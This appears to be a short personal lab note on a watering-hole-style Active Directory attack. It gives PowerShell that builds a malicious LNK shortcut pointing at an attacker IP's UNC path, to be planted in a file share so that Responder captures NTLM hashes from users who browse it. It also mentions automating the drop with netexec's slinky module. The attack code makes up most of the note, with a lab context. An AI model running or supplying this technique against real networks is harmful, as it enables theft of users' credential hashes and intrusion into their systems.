Like watering hole attack

Run these in windows powershell as administrator
and store the LNK file in the fileshare like (`hackme`)
`192.168.138.149` is the attacker IP address

`$objShell = New-Object -ComObject WScript.shell 
`$lnk = $objShell.CreateShortcut("C:\test.lnk") 
`$lnk.TargetPath = "\\192.168.138.149\@test.png" 
`$lnk.WindowStyle = 1 
`$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
`$lnk.Description = "Test" 
`$lnk.HotKey = "Ctrl+Alt+T" 
`$lnk.Save()

![[Pasted image 20250710234341.png]]

Now if we have a responder listening, we would capture the hashes
![[Pasted image 20250710234717.png]]

![[Pasted image 20250710235203.png]]
We can also do it by slinky, using `netexec` which is similar to `crackmapexec` , slinky is spicy LNK file, so instead of manually putting up in the share folder, this can automatically upload in the shares, if this is enabled, but in this lab setup it is not enabled. 